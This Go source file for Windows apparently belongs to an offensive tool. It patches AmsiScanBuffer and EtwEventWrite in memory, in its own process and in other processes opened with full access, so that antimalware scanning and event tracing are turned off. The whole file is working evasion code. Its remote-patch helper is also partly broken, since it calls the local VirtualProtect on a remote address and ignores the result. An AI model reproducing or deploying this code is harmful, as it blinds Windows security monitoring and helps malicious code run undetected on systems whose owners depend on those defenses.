//go:build windows

package main

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// patchAMSI patches AmsiScanBuffer in the current process to always return AMSI_RESULT_CLEAN.
// Patch: B8 57 00 07 80 C3 → mov eax,0x80070057; ret  (E_INVALIDARG — treated as clean by callers)
func patchAMSI() error {
	amsi := windows.NewLazySystemDLL("amsi.dll")
	if err := amsi.Load(); err != nil {
		return fmt.Errorf("amsi.dll not loaded (AMSI may be disabled): %w", err)
	}
	fn := amsi.NewProc("AmsiScanBuffer")
	if err := fn.Find(); err != nil {
		return fmt.Errorf("AmsiScanBuffer not found: %w", err)
	}
	patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
	return patchBytes(fn.Addr(), patch)
}

// patchAMSIRemote patches AmsiScanBuffer inside a remote process identified by pid.
// The remote process must have amsi.dll already loaded.
func patchAMSIRemote(pid uint32) error {
	hProc, err := windows.OpenProcess(processAllAccess, false, pid)
	if err != nil {
		return fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(hProc)

	amsi := windows.NewLazySystemDLL("amsi.dll")
	if err := amsi.Load(); err != nil {
		return fmt.Errorf("amsi.dll not available locally: %w", err)
	}
	fn := amsi.NewProc("AmsiScanBuffer")
	if err := fn.Find(); err != nil {
		return fmt.Errorf("AmsiScanBuffer not found: %w", err)
	}

	// The base address of amsi.dll can differ across processes; this writes relative
	// to where amsi.dll is mapped in *this* process. Works when ASLR base matches (common).
	patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
	return patchBytesRemote(hProc, fn.Addr(), patch)
}

// patchETW patches EtwEventWrite in ntdll.dll to immediately return.
// Patch: C3 → ret  (all callers receive STATUS_SUCCESS which they typically ignore)
func patchETW() error {
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	fn := ntdll.NewProc("EtwEventWrite")
	if err := fn.Find(); err != nil {
		return fmt.Errorf("EtwEventWrite not found: %w", err)
	}
	patch := []byte{0xC3}
	return patchBytes(fn.Addr(), patch)
}

// patchETWRemote patches EtwEventWrite inside a remote process.
func patchETWRemote(pid uint32) error {
	hProc, err := windows.OpenProcess(processAllAccess, false, pid)
	if err != nil {
		return fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(hProc)

	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	fn := ntdll.NewProc("EtwEventWrite")
	if err := fn.Find(); err != nil {
		return fmt.Errorf("EtwEventWrite not found: %w", err)
	}

	patch := []byte{0xC3}
	return patchBytesRemote(hProc, fn.Addr(), patch)
}

// patchBytes changes the protection of addr, writes patch, then restores protection.
func patchBytes(addr uintptr, patch []byte) error {
	size := uintptr(len(patch))
	var old uint32
	r, _, e := procVirtualProtect.Call(addr, size, windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&old)))
	if r == 0 {
		return fmt.Errorf("VirtualProtect(RWX): %v", e)
	}
	for i, b := range patch {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
	}
	procVirtualProtect.Call(addr, size, uintptr(old), uintptr(unsafe.Pointer(&old)))
	return nil
}

// patchBytesRemote writes patch into a remote process at addr using WriteProcessMemory.
func patchBytesRemote(hProc windows.Handle, addr uintptr, patch []byte) error {
	var old uint32
	// VirtualProtectEx — use WriteProcessMemory directly since the region may not
	// be directly mappable; instead we try VirtualProtectEx then WriteProcessMemory.
	r, _, e := procVirtualProtect.Call(addr, uintptr(len(patch)), windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&old)))
	_ = r

	var written uintptr
	r2, _, e2 := procWriteProcessMemory.Call(
		uintptr(hProc), addr,
		uintptr(unsafe.Pointer(&patch[0])),
		uintptr(len(patch)),
		uintptr(unsafe.Pointer(&written)),
	)
	if r2 == 0 {
		return fmt.Errorf("WriteProcessMemory: %v", e2)
	}
	_ = e
	return nil
}
